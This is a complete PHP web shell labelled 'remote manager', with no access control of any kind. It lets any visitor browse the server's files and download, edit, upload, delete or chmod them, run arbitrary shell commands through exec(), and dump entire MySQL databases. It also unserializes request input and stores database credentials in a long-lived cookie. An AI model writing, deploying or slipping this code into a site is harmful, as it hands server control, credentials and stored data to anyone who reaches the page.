<?
	function list_compare($a, $b)
	{
		if($a['access'][0]==$b['access'][0])
			return $a['name']>$b['name'];
		return $a['access']>$b['access'];
	}

	function stripinputslashes($array)
	{
		if(is_array($array)&&count($array)>0)
			foreach($array as $key=>$value)
			{
				if(is_string($array[$key]))
					$array[$key]=stripslashes($value);
				if(is_array($array[$key]))
					$array[$key]=stripinputslashes($value);
			}
		return $array;
	}

	ob_implicit_flush();
	set_time_limit(0);

	if(get_magic_quotes_gpc()==1)
		$_REQUEST=stripinputslashes($_REQUEST);

	if($_REQUEST['mysql']['send_fname']=='')
		session_start();

	if($_REQUEST['remote_manager']!='')
		$storage=unserialize($_REQUEST['remote_manager']);
	else
		$storage=array();

	$listing=array();

	if($storage['path']=='')
		$storage['path']='.';

	if($_REQUEST['action']=='set_filter')
	{
		$storage['filter']=$_REQUEST['filter'];
		$storage['display_options']=$_REQUEST['display_options'];
	}

	if($_REQUEST['action']=='get'&&$_REQUEST['file']!=''&&file_exists($_REQUEST['file']))
	{
		$_pi=pathinfo($_REQUEST['file']);
		header('Content-type: application/octet-stream');//archive/zip');
		header("Content-Disposition: attachment; filename=".$_pi['basename']);
		header("Content-Length: ".filesize($_REQUEST['file']));
		readfile($_REQUEST["file"]);
		exit();
	}

	if($_REQUEST['action']=='edit'&&$_REQUEST['file']!='')
		$_file=array('name'=>$_REQUEST['file'], 'content'=>htmlspecialchars(join("", file($_REQUEST['file']))));

	if($_REQUEST['action']=='change_file')
	{
		if($_FILES['upload_file']['name']!='')
		{
			if($_REQUEST['filename']!='')
				move_uploaded_file($_FILES['upload_file']['tmp_name'], $storage['path']."/".$_REQUEST['filename']);
			else
				move_uploaded_file($_FILES['upload_file']['tmp_name'], $storage['path']."/".$_FILES['upload_file']['name']);
		}
		else
		{
			$f=fopen($_REQUEST["filename"], 'w+');
			fwrite($f, $_REQUEST['file_content']);
			fclose($f);
		}
	}

	if($storage['cmd_history']==''||$_REQUEST['action']=='clear_cmd_history')
		$storage['cmd_history']=array();

	if($_REQUEST['action']=='run_command')
	{
		chdir($storage['path']);
		$cmd=$_REQUEST['command'];
		$cmd=str_replace(array("\r","\n"), array('', ''), $cmd);
		$return=array();
		exec($cmd, $return, $ret_code);
		$storage['cmd_history'][]=array('command'=>$cmd, 'return'=>$return, 'ret_code'=>$ret_code);
		$storage['path']=getcwd();
	}
	if($_REQUEST['action']=='delete'&&is_array($_REQUEST['to_delete']))
		foreach($_REQUEST['to_delete'] as $key=>$value)
			unlink($value);


	if($_REQUEST['action']=='set_perms'&&is_array($_REQUEST['perm']))
		foreach($_REQUEST['perm'] as $key=>$value)
			if($key!='.'&&$key!='..')
				chmod($storage['path'].'/'.$key, base_convert($value, 8, 10));

	if($_REQUEST['action']=='run_mysql_query')
	{
		$storage['mysql']=$_REQUEST['mysql'];
		$storage['mysql']['query']='';
		if($_REQUEST['mysql']['hide_prev_query']==1)
			$storage['mysql']['query']='';

		mysql_pconnect($_REQUEST['mysql']['host'], $_REQUEST['mysql']['username'], $_REQUEST['mysql']['password']);
		if($_REQUEST['mysql']['database']!='')
			mysql_select_db($_REQUEST['mysql']['database']);

		$mysql_errors_count=0;

		$mysql_resutls=array();


		if($_REQUEST['mysql']['dump']==1)
		{
			$tables_r=mysql_query('show tables');
			$query='';
			while(($_table=mysql_fetch_array($tables_r))!==false)
			{
				$create=mysql_fetch_array(mysql_query('show create table `'.mysql_escape_string($_table[0]).'`'));
				$query.=$create[1].";\n";

				$select_r=mysql_query('select * from `'.mysql_escape_string($_table[0]).'`') or die(mysql_error());
				while(($item=mysql_fetch_assoc($select_r))!==false)
				{
					$query.='INSERT INTO `'.mysql_escape_string($_table[0]).'` VALUES(';
					$n=0;
					foreach($item as $value)
					{
						if($n>0)
							$query.=', ';
						$query.="'".mysql_escape_string($value)."'";
						$n++;
					}
					$query.=");\n";
				}
			}
			$mysql_results[]=array('query'=>$query);
		}

		else
		{

			if($_REQUEST['mysql']['server_file']!=''&&is_file($_REQUEST['mysql']['server_file']))
			{
				if($_REQUEST['mysql']['input_gzipped']!='')
				{
					$_gzf=gzopen($_REQUEST['mysql']['server_file'], 'r');
					$_str=gzread($_gzf, 32*1024*1024);
					gzclose($_gzf);
				}
				else
					$_str=file_get_contents($_REQUEST['mysql']['server_file']);
			}
			elseif($_FILES['sql_file']['name']!='')
			{
				if($_REQUEST['mysql']['input_gzipped']!='')
				{
					$_gzf=gzopen($_FILES['sql_file']['tmp_name'], 'r');
					$_str=gzread($_gzf, 99999999);
					gzclose($_gzf);
				}
				else
					$_str=file_get_contents($_FILES['sql_file']['tmp_name']);
			}
			else
				$_str=$_REQUEST['mysql']['query'];

			$comment = 0;
			$quotetype = '';
			$quote = 0;

			$queries=array();
			$_query='';

			for($i=0;$i<strlen($_str);$i++)
			{
				$char=$_str[$i];

				if ($comment==0 && $quote==1 && $_str[$i-1]!="\\" && $_str[$i] == $quotetype)
					$quote = 0;

				elseif($comment==0 && $quote==0&&($char=="`" || $char=="'" || $char=="\""))
				{
					$quote = 1;
					$quotetype = $char;
				}

				if (($char=='#' || (($char=='-' && $_str[$i+1]=='-')||($char=='-' && $_str[$i-1]=='-'))) && $quote==0)
					$comment = 1;
				if ($comment==1 && $char == "\n")
					$comment=0;

				if ($char == ';' && $quote==0 && $comment==0)
				{
					$_query.=$char;
					$_query=trim($_query);
	
					$queries[] = $_query;

					$_query = '';
				}
				elseif ($comment ==0)
					$_query.=$char;
			}

			if(is_array($queries)&&count($queries)>0)
				foreach($queries as $key=>$value)
				{
					$_start=time();
					$res=mysql_query($value);
					$_end=time();
					if(is_resource($res))
					{
						$_str='';
						while($_result=mysql_fetch_assoc($res))
						{
							if(is_array($_result))
								foreach($_result as $_key=>$_value)
									$_str.=$_key."=>".$_value."\t";
							$_str.="\n\n\n";
						}
						if($storage['mysql']['hide_results']=='')
							$mysql_results[]=array('query'=>$value, 'result'=>$_str, 'start'=>date('H:i:s', $_start), 'end'=>date('H:i:s', $_end));
					}
					else
					{
						if($storage['mysql']['hide_results']=='')
							$mysql_results[]=array('query'=>$value, 'result'=>(bool)$res, 'start'=>date('H:i:s', $_start), 'end'=>date('H:i:s', $_end));
					}
					if(mysql_errno()!=0)
					{
						$mysql_results[count($mysql_results)-1]['error']=mysql_error();
						$mysql_errors_count++;
					}
					unset($queries[$key]);
				}
		}

		if($_REQUEST['mysql']['send_fname']!='')
		{
			$text='';
			foreach($mysql_results as $value)
				$text.=$value['query']."\n".$value['result']."\n";

			if($_REQUEST['mysql']['gzip']==1)
				$text=gzencode($text);

			Header('Content-Type: application/octet-stream');
			header("Content-Disposition: attachment; filename=".$_REQUEST['mysql']['send_fname']);
			header("Content-Length: " . strlen( $text ) );
			echo $text;
			exit();
		}

	}

	$_path=$_REQUEST['chdir'];
	$_path=$_path==''?$storage['path']:$_path;

	$storage['path']=realpath($_path);

	$dir=opendir($storage['path']);
	if($dir===false)
		$dir=opendir('.');

	while(false!==($file=readdir($dir)))
	{
		$stat=stat($storage['path']."/".$file);
		$perms=sprintf('%06o', $stat['mode']);
		$access=sprintf('%016b', $stat['mode']);
		$perms_num=substr($perms, 3, 3);
		if($storage['filter']==''||preg_match('/'.$storage['filter'].'/isU', $file))
			$listing[]=array('path'=>realpath($storage['path'].'/'.$file), 'name'=>$file, 'perms'=>$perms, 'access'=>$access, 'size'=>$stat['size'], 'perms_num'=>$perms_num);
	}
	closedir($dir);
	usort($listing, "list_compare");

	setcookie('remote_manager', serialize($storage), time()+60*60*24*180);

?>
<html>
<head>
<title>remote manager</title>
<script language="JavaScript">
	function go(value)
	{
		this.document.forms[1].elements['action'].value=value;
		this.document.forms[1].submit();
	}
</script>
<style>
body, table, input, textarea
{
	font-size:11px;
	font-family: Verdana, Tahoma;
}
</style>
</head>
<body>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
	<tr>
		<td colspan="13">Real path is "<?=htmlspecialchars(realpath($storage['path']));?>"</td>
	</tr>
	<form action="?" method="post">
	<tr>
		<td colspan="5">File search filter(regular expression):<input type="Text" name="filter" value="<?=htmlspecialchars($storage['filter']);?>">
		<select name="display_options">
		<option value=""<?if($storage['display_options']==''){?> selected<?}?>>Show all
		<option value="dirs"<?if($storage['display_options']=='dirs'){?> selected<?}?>>Show only directories
		<option value="files"<?if($storage['display_options']=='files'){?> selected<?}?>>Show only files
		<option value="no"<?if($storage['display_options']=='no'){?> selected<?}?>>Show no listing
		</select><input type="Submit" value="Set displaying options"></td>
		<input type="Hidden" name="action" value="set_filter">
	</tr>
	</form>
	<tr>
		<td>delete</td>
		<td>enter/edit/get</td>
		<td>name</td>
		<td>size</td>
		<td>perms</td>
	</tr>
	<tr>
		<td colspan="5">&nbsp;</td>
	</tr>
	<form action="?" method="post" enctype="multipart/form-data" name="main_form">
	<?foreach($listing as $value)if($storage['display_options']==''||$storage['display_options']=='files'&&$value['access'][0]==1||$storage['display_options']=='dirs'&&$value['access'][0]!=1){?>
	<tr>
		<td><input type="Checkbox" name="to_delete[]" value="<?=htmlspecialchars($value['path']);?>"></td>
		<td><?if($value['access'][0]==1)
		{?>
		<a href="?action=edit&file=<?=urlencode($value['path']);?>">edit</a>&nbsp;|&nbsp;
		<a href="?action=get&file=<?=urlencode($value['path']);?>">get</a>
		<?}else{?>
		<a href="?chdir=<?=urlencode($value['path']);?>">enter</a>
		<?}?></td>
		<td><?=$value['name'];?></td>
		<td><?=$value['access'][0]==1?$value['size']:'';?></td>
		<td align="center"><input type="Text" name="perm[<?=$value['name'];?>]" value="<?=$value['perms_num'];?>" size="3"></td>
	</tr>
	<?}?>
	<tr>
		<td colspan="3" align="left"><input type="Button" value="Delete checked" onclick="go('delete');"></td>
		<td colspan="2" align="center"><input type="Button" value="Set permissions" onclick="go('set_perms');"></td>
	</tr>
		<input type="Hidden" name="action" value="">
	</form>
	<tr>
		<td colspan="14" width="10">


		<table border="0" cellpadding="0" cellspacing="0" width="100%">
	<form action="?" method="post" name="edit_form" enctype="multipart/form-data">

		<tr>
			<td valign="top"><table border="0" cellpadding="0" cellspacing="0" width="100%">

			<tr>
				<td>
				<b>Upload/Create new file:</b><br>
		Contents:<br>
			<textarea name="file_content" rows="15" cols="70" wrap="off"><?=$_file['content'];?></textarea>
		</td>
	</tr>
	<tr>
		<td colspan="1">
			or upload file here:<input type="File" name="upload_file"><br>
			name this file:<input type="Text" name="filename" size="50" value="<?=$_file['name'];?>">
		</td>
	</tr>
	<tr>
		<td colspan="1">
			<input type="Hidden" name="action" value="change_file">
			<input type="Submit" value="Upload">
		</td>
	</form>
		</tr>
			</table>
			</td>
			<td>&nbsp;</td>

			<td valign="top"><table border="0" cellpadding="0" cellspacing="0" width="100%">
				<tr>
				<form action="?" method="post">
					<td>
						<b>Run server commands here:</b>
					</td>
				</tr>
				<tr>
					<td>
						Previous history:<br>
						<a href="?action=clear_cmd_history"><small>clear history</small></a><br>
						<textarea rows="15" cols="70" wrap="off"><?
							if(is_array($storage['cmd_history']))
								foreach($storage['cmd_history'] as $value)
								{
									echo "Command: ".$value['command']."\nReturned code ".$value['ret_code']."\nCommand output:\n";
									if(is_array($value['return']))
										foreach($value['return'] as $_key2=>$_value2)
											echo htmlspecialchars($_value2)."\n";
								}
						?></textarea>
					</td>
				</tr>
				<tr>
					<td>
						Command:<br><textarea name="command" rows="5" cols="70"></textarea>
					</td>
				</tr>
				<tr>
					<td><input type="Submit" value="Go"></td>
					<input type="Hidden" name="action" value="run_command">
				</tr>
			</form>
			</table>
		</td></tr></table></td>


	</tr>
	<tr>
		<td colspan="14"><b>Run MySQL query:</b><hr>
			<table border="0" cellpadding="3" cellspacing="0" width="100%">
				<form action="?" method="post" enctype="multipart/form-data">
				<tr>
					<td>Host:</td>
					<td><input type="Text" name="mysql[host]" value="<?=$storage['mysql']['host'];?>"></td>
					<td>Get database dump</td>
					<td><input type="Checkbox" name="mysql[dump]" value="1"<? if($storage['mysql']['dump']){?> checked<?}?>></td>
				</tr>
				<tr>
					<td>UserName:</td>
					<td><input type="Text" name="mysql[username]" value="<?=$storage['mysql']['username'];?>"></td>
					<td>Send as file, filename:</td>
					<td><input type="Text" name="mysql[send_fname]" value="<?=$storage['mysql']['send_fname'];?>">
					<input type="Checkbox" name="mysql[gzip]" value="1"<?if($storage['mysql']['gzip']==1){?> checked<?}?>>gzip</td>
				</tr>
				<tr>
					<td>Password:</td>
					<td><input type="Text" name="mysql[password]" value="<?=$storage['mysql']['password'];?>"></td>
				</tr>
				<tr>
					<td>Database:</td>
					<td><input type="Text" name="mysql[database]" value="<?=$storage['mysql']['database'];?>"></td>
				</tr>
				<tr>
					<td colspan="2">
						Query:<br>
<?						if($mysql_errors_count!=0) : ?>
							<font color="red" ><?=$mysql_errors_count;?> errors encountered</font>
<?						endif; ?>
						<textarea name="mysql[query]" rows="10" cols="70" wrap="off"><?=$storage['mysql']['hide_prev_query']!=1?htmlspecialchars($_REQUEST['mysql']['query']):'';?></textarea></td>
					<td colspan="2">Results:<br><textarea rows="10" cols="70"><?if(is_array($mysql_results))
						foreach($mysql_results as $value)
							if(($storage['mysql']['hide_results']==1&&$value['error']!='')||($storage['mysql']['hide_results']==''))
								echo $value['start'].' - '.$value['end']."\r\n".htmlspecialchars($value['query'])."\n".htmlspecialchars($value['result']).($value['error']!=''?"\n".$value['error']:'').
								"\n-------------------------\n\n";?></textarea></td>
				</tr>
				<tr>
					<td>Or run query from file on webserver:</td>
					<td><input type="Text" name="mysql[server_file]" value="<?=htmlspecialchars(realpath($storage['path']));?>"></td>
					<td>Or upload an SQL file:</td>
					<td>
					<input type="file" name="sql_file">
					</td>
				</tr>
				<td>
					<td colspan="2" align="center"><input type="Checkbox" name="mysql[input_gzipped]" value="1">File is gzipped</td>
				</tr>
				<tr>
					<td>Show only errors in "result" field</td>
					<td><input type="Checkbox" name="mysql[hide_results]" value="1"<? if($storage['mysql']['hide_results']){?> checked<?}?>></td>
				</tr>
				<tr>
					<td>Do not show this query here again</td>
					<td><input type="Checkbox" name="mysql[hide_prev_query]" value="1"<? if($storage['mysql']['hide_prev_query']){?> checked<?}?>></td>
				</tr>
				<tr>
					<td colspan="2" align="center"><input type="Submit" value="Run query"></td>
					<input type="hidden" name="action" value="run_mysql_query">
				</tr>
				</form>
			</table>
		</td>
	</tr>
</table></body>
</html>